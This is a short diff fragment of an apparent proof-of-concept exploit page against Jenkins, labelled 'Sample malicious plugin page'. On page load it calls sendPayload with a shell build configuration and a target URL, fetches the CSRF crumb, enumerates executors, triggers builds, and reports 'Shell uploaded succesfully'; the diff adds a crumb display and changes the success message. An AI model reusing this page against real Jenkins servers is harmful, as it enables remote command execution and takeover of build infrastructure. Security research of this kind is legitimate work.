@@ -6,6 +6,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
   <body onload="sendPayload('CONF_BUILD_Shell','lol','http://192.168.253.128:8080')">
     <div>
       Sample malicious plugin page
+      <p>Your crumb is:<div id="crumb"></div></p>
       <div id="result"></div>
       <script type="text/javascript">
         function getCrumb(host) {
@@ -63,7 +64,7 @@ So if you want to host script on some phishy domain, it will work only on jenkin
           //alert(executors)
             rubBuild(name2,host);
           }
-          document.getElementById("result").innerHTML = "TOU HAVE BEEN HACKED!!";
+          document.getElementById("result").innerHTML = "Shell uploaded succesfully";
         }
         function getExecutors(host){
           var xhttp = new XMLHttpRequest();
